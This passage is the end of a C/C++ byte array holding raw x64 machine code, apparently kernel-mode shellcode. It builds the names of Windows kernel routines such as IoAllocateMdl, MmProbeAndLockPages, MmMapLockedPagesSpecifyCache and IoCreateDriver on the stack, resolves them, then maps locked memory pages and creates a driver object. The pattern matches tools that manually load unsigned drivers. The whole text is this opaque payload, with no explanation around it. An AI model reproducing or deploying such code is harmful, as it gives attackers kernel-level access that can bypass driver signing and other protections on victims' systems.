	0x00, 0x66, 0x89, 0x84, 0x24, 0x9e, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0xa0, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa2, 
	0x01, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa4, 0x01, 0x00, 0x00, 
	0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xa6, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x66, 
	0x89, 0x84, 0x24, 0xa8, 0x01, 0x00, 0x00, 0xb8, 0x49, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x80, 0x00, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x82, 0x00, 0x00, 
	0x00, 0xb8, 0x41, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0xb8, 0x6c, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x86, 0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x8a, 0x00, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x8c, 0x00, 
	0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x8e, 0x00, 0x00, 0x00, 0xb8, 
	0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x92, 0x00, 0x00, 0x00, 0xb8, 0x4d, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x96, 
	0x00, 0x00, 0x00, 0xb8, 0x6c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 
	0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0x9a, 0x00, 0x00, 0x00, 0xb8, 0x4d, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0xb8, 0x6d, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x2a, 0x01, 0x00, 0x00, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2c, 0x01, 0x00, 
	0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2e, 0x01, 0x00, 0x00, 0xb8, 0x6f, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0xb8, 0x62, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x32, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x34, 0x01, 0x00, 0x00, 0xb8, 0x41, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x36, 0x01, 
	0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0xb8, 
	0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3a, 0x01, 0x00, 0x00, 0xb8, 0x4c, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x3c, 0x01, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x3e, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x40, 
	0x01, 0x00, 0x00, 0xb8, 0x6b, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x42, 0x01, 0x00, 0x00, 
	0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x44, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x46, 0x01, 0x00, 0x00, 0xb8, 0x67, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x48, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x4a, 0x01, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x4c, 0x01, 0x00, 
	0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0x4e, 0x01, 0x00, 0x00, 0xb8, 0x4b, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xe0, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xe2, 0x01, 0x00, 0x00, 0xb8, 0x55, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe4, 0x01, 
	0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe6, 0x01, 0x00, 0x00, 0xb8, 
	0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe8, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0xea, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0xec, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xee, 
	0x01, 0x00, 0x00, 0xb8, 0x6b, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf0, 0x01, 0x00, 0x00, 
	0xb8, 0x44, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf2, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf4, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xf6, 0x01, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0xf8, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xfa, 0x01, 0x00, 
	0x00, 0xb8, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xfc, 0x01, 0x00, 0x00, 0xb8, 0x50, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xfe, 0x01, 0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x00, 0x02, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x02, 0x02, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x04, 0x02, 
	0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x06, 0x02, 0x00, 0x00, 0xb8, 
	0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x08, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x0a, 0x02, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0x0c, 
	0x02, 0x00, 0x00, 0xb8, 0x4f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 
	0xb8, 0x62, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x52, 0x01, 0x00, 0x00, 0xb8, 0x66, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x54, 0x01, 0x00, 0x00, 0xb8, 0x44, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x56, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x58, 0x01, 0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5a, 0x01, 0x00, 
	0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5c, 0x01, 0x00, 0x00, 0xb8, 0x66, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5e, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x60, 0x01, 0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x62, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x64, 0x01, 
	0x00, 0x00, 0xb8, 0x6e, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x66, 0x01, 0x00, 0x00, 0xb8, 
	0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x6a, 0x01, 0x00, 0x00, 0xb8, 0x4f, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x6c, 0x01, 0x00, 0x00, 0xb8, 0x62, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x6e, 
	0x01, 0x00, 0x00, 0xb8, 0x6a, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x70, 0x01, 0x00, 0x00, 
	0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x72, 0x01, 0x00, 0x00, 0xb8, 0x63, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x74, 0x01, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x76, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x66, 0x89, 0x84, 0x24, 0x78, 0x01, 0x00, 
	0x00, 0xb8, 0x4d, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x48, 0x02, 0x00, 0x00, 0xb8, 0x6d, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x4a, 0x02, 0x00, 0x00, 0xb8, 0x4d, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x4c, 0x02, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x4e, 0x02, 0x00, 0x00, 0xb8, 0x70, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x50, 0x02, 
	0x00, 0x00, 0xb8, 0x4c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x52, 0x02, 0x00, 0x00, 0xb8, 
	0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x54, 0x02, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x56, 0x02, 0x00, 0x00, 0xb8, 0x6b, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x58, 0x02, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5a, 
	0x02, 0x00, 0x00, 0xb8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5c, 0x02, 0x00, 0x00, 
	0xb8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x5e, 0x02, 0x00, 0x00, 0xb8, 0x61, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x60, 0x02, 0x00, 0x00, 0xb8, 0x67, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0x62, 0x02, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x64, 0x02, 0x00, 0x00, 0xb8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x66, 0x02, 0x00, 
	0x00, 0xb8, 0x53, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x68, 0x02, 0x00, 0x00, 0xb8, 0x70, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x6a, 0x02, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0x6c, 0x02, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0x6e, 0x02, 0x00, 0x00, 0xb8, 0x69, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x70, 0x02, 
	0x00, 0x00, 0xb8, 0x66, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x72, 0x02, 0x00, 0x00, 0xb8, 
	0x79, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x74, 0x02, 0x00, 0x00, 0xb8, 0x43, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0x76, 0x02, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x78, 0x02, 0x00, 0x00, 0xb8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x7a, 
	0x02, 0x00, 0x00, 0xb8, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x7c, 0x02, 0x00, 0x00, 
	0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x7e, 0x02, 0x00, 0x00, 0x33, 0xc0, 0x66, 
	0x89, 0x84, 0x24, 0x80, 0x02, 0x00, 0x00, 0xb8, 0x34, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x88, 0x03, 0x00, 0x00, 0xb8, 0x36, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x8a, 0x03, 0x00, 
	0x00, 0x48, 0x8d, 0x84, 0x24, 0x10, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x03, 0x00, 
	0x00, 0xb8, 0x28, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x03, 0x00, 0x00, 0xb8, 0x2a, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9a, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0x80, 
	0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa0, 0x03, 0x00, 0x00, 0xb8, 0x1a, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xa8, 0x03, 0x00, 0x00, 0xb8, 0x1c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xaa, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 
	0x24, 0xb0, 0x03, 0x00, 0x00, 0xb8, 0x26, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xb8, 0x03, 
	0x00, 0x00, 0xb8, 0x28, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xba, 0x03, 0x00, 0x00, 0x48, 
	0x8d, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xc0, 0x03, 0x00, 0x00, 0xb8, 
	0x2c, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc8, 0x03, 0x00, 0x00, 0xb8, 0x2e, 0x00, 0x00, 
	0x00, 0x66, 0x89, 0x84, 0x24, 0xca, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0xe0, 0x01, 0x00, 
	0x00, 0x48, 0x89, 0x84, 0x24, 0xd0, 0x03, 0x00, 0x00, 0xb8, 0x28, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0x70, 0x04, 0x00, 0x00, 0xb8, 0x2a, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x72, 
	0x04, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x78, 
	0x04, 0x00, 0x00, 0xb8, 0x38, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe0, 0x03, 0x00, 0x00, 
	0xb8, 0x3a, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xe2, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 
	0x24, 0x48, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xe8, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x8c, 
	0x24, 0x88, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 0x38, 0x48, 0x89, 0x84, 0x24, 0x18, 0x04, 0x00, 
	0x00, 0x48, 0x8d, 0x8c, 0x24, 0x98, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 0x38, 0x48, 0x89, 0x84, 
	0x24, 0xd8, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xa8, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 
	0x38, 0x48, 0x89, 0x84, 0x24, 0x30, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xb8, 0x03, 0x00, 
	0x00, 0xff, 0x54, 0x24, 0x38, 0x48, 0x89, 0x84, 0x24, 0x68, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x8c, 
	0x24, 0xc8, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 0x38, 0x48, 0x89, 0x84, 0x24, 0x08, 0x03, 0x00, 
	0x00, 0x48, 0x8d, 0x8c, 0x24, 0x70, 0x04, 0x00, 0x00, 0xff, 0x54, 0x24, 0x38, 0x48, 0x89, 0x84, 
	0x24, 0x10, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xe0, 0x03, 0x00, 0x00, 0xff, 0x54, 0x24, 
	0x38, 0x48, 0x89, 0x84, 0x24, 0x18, 0x03, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x01, 0x00, 0x00, 
	0xc0, 0x48, 0x8d, 0x94, 0x24, 0xf0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, 0x8b, 
	0x48, 0x10, 0xff, 0x94, 0x24, 0x18, 0x04, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xe4, 0x00, 0x00, 
	0x00, 0x48, 0x8d, 0x84, 0x24, 0x90, 0x04, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xc8, 0x02, 0x00, 
	0x00, 0x48, 0xc7, 0x84, 0x24, 0xc0, 0x02, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x84, 
	0x24, 0xc0, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x10, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x84, 
	0x24, 0xc0, 0x02, 0x00, 0x00, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x84, 0x24, 0xc0, 0x02, 0x00, 0x00, 
	0x48, 0x83, 0xbc, 0x24, 0x10, 0x04, 0x00, 0x00, 0x00, 0x76, 0x20, 0x48, 0x8b, 0x84, 0x24, 0xc8, 
	0x02, 0x00, 0x00, 0xc6, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xc8, 0x02, 0x00, 0x00, 0x48, 0xff, 
	0xc0, 0x48, 0x89, 0x84, 0x24, 0xc8, 0x02, 0x00, 0x00, 0xeb, 0xb2, 0x48, 0x8d, 0x94, 0x24, 0x90, 
	0x04, 0x00, 0x00, 0x48, 0x8b, 0x8c, 0x24, 0xf0, 0x02, 0x00, 0x00, 0xff, 0x94, 0x24, 0xd8, 0x03, 
	0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x45, 0x33, 
	0xc0, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x8b, 0x50, 0x20, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, 0x8b, 
	0x48, 0x18, 0xff, 0x94, 0x24, 0x30, 0x04, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x83, 
	0x7c, 0x24, 0x40, 0x00, 0x74, 0x11, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0x4c, 0x24, 0x40, 
	0xff, 0x94, 0x24, 0x68, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x90, 0x04, 0x00, 0x00, 0xff, 
	0x94, 0x24, 0x08, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x8c, 0x24, 0xf0, 0x02, 0x00, 0x00, 0xff, 0x94, 
	0x24, 0x10, 0x03, 0x00, 0x00, 0x48, 0x83, 0x7c, 0x24, 0x40, 0x00, 0x74, 0x4b, 0xc7, 0x44, 0x24, 
	0x28, 0x10, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc9, 
	0x41, 0xb8, 0x02, 0x00, 0x00, 0x00, 0xb2, 0x01, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x94, 0x24, 
	0x18, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x8c, 0x24, 0xf8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08, 
	0x48, 0x8b, 0x84, 0x24, 0xf8, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0x48, 0x89, 0x08, 
	0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xe9, 0xa4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x84, 
	0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0xd0, 0x02, 0x00, 
	0x00, 0x48, 0x8b, 0x84, 0x24, 0xd0, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x89, 0x84, 0x24, 
	0x00, 0x03, 0x00, 0x00, 0x48, 0x83, 0xbc, 0x24, 0x00, 0x03, 0x00, 0x00, 0x00, 0x75, 0x0a, 0xb8, 
	0x01, 0x00, 0x00, 0xc0, 0xe9, 0xc1, 0x01, 0x00, 0x00, 0xb8, 0x49, 0x00, 0x00, 0x00, 0x66, 0x89, 
	0x84, 0x24, 0xc0, 0x00, 0x00, 0x00, 0xb8, 0x6f, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc2, 
	0x00, 0x00, 0x00, 0xb8, 0x43, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc4, 0x00, 0x00, 0x00, 
	0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc6, 0x00, 0x00, 0x00, 0xb8, 0x65, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xc8, 0x00, 0x00, 0x00, 0xb8, 0x61, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xca, 0x00, 0x00, 0x00, 0xb8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0xcc, 0x00, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xce, 0x00, 0x00, 
	0x00, 0xb8, 0x44, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0xb8, 0x72, 
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd2, 0x00, 0x00, 0x00, 0xb8, 0x69, 0x00, 0x00, 0x00, 
	0x66, 0x89, 0x84, 0x24, 0xd4, 0x00, 0x00, 0x00, 0xb8, 0x76, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 
	0x24, 0xd6, 0x00, 0x00, 0x00, 0xb8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xd8, 0x00, 
	0x00, 0x00, 0xb8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xda, 0x00, 0x00, 0x00, 0x33, 
	0xc0, 0x66, 0x89, 0x84, 0x24, 0xdc, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd0, 0x02, 0x00, 
	0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0x20, 0x03, 0x00, 0x00, 0xb8, 0x1c, 0x00, 
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xf0, 0x03, 0x00, 0x00, 0xb8, 0x1e, 0x00, 0x00, 0x00, 0x66, 
	0x89, 0x84, 0x24, 0xf2, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0xc0, 0x00, 0x00, 0x00, 0x48, 
	0x89, 0x84, 0x24, 0xf8, 0x03, 0x00, 0x00, 0xb8, 0x06, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 
	0x00, 0x04, 0x00, 0x00, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x02, 0x04, 0x00, 
	0x00, 0x48, 0x8b, 0x84, 0x24, 0x20, 0x03, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x08, 0x04, 0x00, 
	0x00, 0x48, 0x8d, 0x8c, 0x24, 0xf0, 0x03, 0x00, 0x00, 0xff, 0x94, 0x24, 0x00, 0x03, 0x00, 0x00, 
	0x48, 0x89, 0x84, 0x24, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x84, 0x24, 0xd0, 0x02, 0x00, 0x00, 
	0x48, 0x8b, 0x50, 0x10, 0x48, 0x8d, 0x8c, 0x24, 0x00, 0x04, 0x00, 0x00, 0xff, 0x94, 0x24, 0x28, 
	0x03, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xeb, 0x08, 0xc7, 0x44, 0x24, 0x30, 0x10, 0x00, 0x00, 
	0xc0, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x30, 0x89, 0x48, 0x30, 
	0x48, 0x83, 0x7c, 0x24, 0x60, 0x00, 0x74, 0x3e, 0x83, 0x7c, 0x24, 0x30, 0x00, 0x75, 0x16, 0x48, 
	0x8b, 0x44, 0x24, 0x60, 0x8b, 0x40, 0x08, 0x48, 0x8b, 0x8c, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 
	0x89, 0x41, 0x38, 0xeb, 0x10, 0x48, 0x8b, 0x84, 0x24, 0xd8, 0x04, 0x00, 0x00, 0x48, 0xc7, 0x40, 
	0x38, 0x00, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0x8c, 0x24, 0xd8, 0x04, 0x00, 0x00, 0xff, 
	0x94, 0x24, 0x30, 0x03, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x30, 0x48, 0x81, 0xc4, 0xc8, 0x04, 0x00, 
	0x00, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc 
	
    };
}